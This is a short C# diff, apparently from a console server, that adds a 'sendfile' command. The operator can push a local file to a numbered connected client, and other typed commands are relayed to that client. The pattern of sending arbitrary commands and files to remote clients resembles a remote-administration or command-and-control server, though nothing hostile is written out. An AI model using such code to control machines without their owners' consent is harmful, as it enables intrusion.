@@ -78,7 +78,24 @@ namespace Server
                 if (int.TryParse(parts[0], out int clientId))
                 {
                     string command = parts[1];
-                    ServerSocket.SendCommand(clientId, command);
+
+                    if (command.StartsWith("sendfile "))
+                    {
+                        string filePath = command.Substring(9).Trim();
+                        if (File.Exists(filePath))
+                        {
+                            ServerSocket.SendFileToClient(clientId, filePath);
+                        }
+                        else
+                        {
+                            Console.WriteLine($"[ERROR] El archivo '{filePath}' no existe.");
+                        }
+                    }
+                    else
+                    {
+                        ServerSocket.SendCommand(clientId, command);
+                    }
+
                     ServerSocket.setWaiting(true);
                 }
                 else
@@ -88,5 +105,6 @@ namespace Server
                 }
             }
         }
+        
     }
 }
